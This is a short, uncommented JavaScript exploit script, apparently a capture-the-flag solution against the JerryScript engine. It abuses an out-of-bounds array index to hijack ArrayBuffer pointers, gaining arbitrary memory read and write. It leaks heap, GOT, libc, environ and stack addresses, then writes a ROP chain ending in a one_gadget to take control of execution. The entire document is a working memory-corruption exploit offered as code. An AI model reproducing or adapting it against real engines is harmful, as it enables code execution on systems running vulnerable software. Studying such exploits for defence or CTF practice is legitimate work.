let a = ["11111111"]
a.shift()
ab = new ArrayBuffer(0x1000)
dv = new DataView(ab)
dv.setUint32(0, 0x41414141, true)

ab2 = new ArrayBuffer(0x1000)
dv2 = new DataView(ab2)
dv2.setUint32(0, 0x43434343, true)

print("ArrayBuffer: 0x"+(a[0xf0]*0x10).toString(16))

// b *0x55555555d0e9 0x7ffff7ffdf60
// x/100xg 0x5555555c1460
// 0x5555555c1560 0x5555555c15b8

heap_base_offset = 0xb5
control_base = 0x34
shift = 0x10
idx = 0xf0
jerry_global_heap = [1, 2]
jerry_global_heap[0] = a[idx] - heap_base_offset
zero = 0
one = 1
hex = 0x10
high = 0x100000000
free_got = [zero, one]
libc_addr = [zero, one]
one_gadget = zero
environ_addr = zero
stack_addr = zero
pop_rsi = zero

a[idx] = jerry_global_heap[zero] + control_base
jerry_global_heap[one] = dv.getUint32(0xc, true)
jerry_global_heap[zero] = jerry_global_heap[zero]*shift
print("jerry_global_heap: 0x"+(jerry_global_heap[zero] + jerry_global_heap[one]*high).toString(hex))

free_got[one] = jerry_global_heap[one]
free_got[zero] = jerry_global_heap[zero] - 0x1490
free_got = free_got[zero] + free_got[one]*high
print("free_got: 0x"+  (free_got.toString(hex)))
dv.setBigUint64(0x8, free_got, true)

libc_addr[zero] = dv2.getUint32(0x0, true) - 0x9d850
libc_addr[one] = dv2.getUint32(0x4, true)
libc_addr = libc_addr[zero] + libc_addr[one]*high
print("libc_addr: 0x"+libc_addr.toString(hex))

environ_addr = libc_addr + 0x1ef2e0 - 0x10
print("environ_addr: 0x" + environ_addr.toString(hex))
pop_r12 = libc_addr + 0x32b59
one_gadget = libc_addr + 0xe6c7e
print("one_gadget: 0x" + one_gadget.toString(hex))

dv.setBigUint64(0x8, environ_addr, true)
stack_addr = parseInt(dv2.getBigUint64(0x0, true)) - 0x108 - 0x10
print("stack_addr: 0x" + stack_addr.toString(hex))

dv.setBigUint64(0x8, stack_addr, true)
dv2.setBigUint64(0x0, pop_r12, true)
dv2.setBigUint64(0x8, zero, true)
dv2.setBigUint64(0x10, one_gadget, true)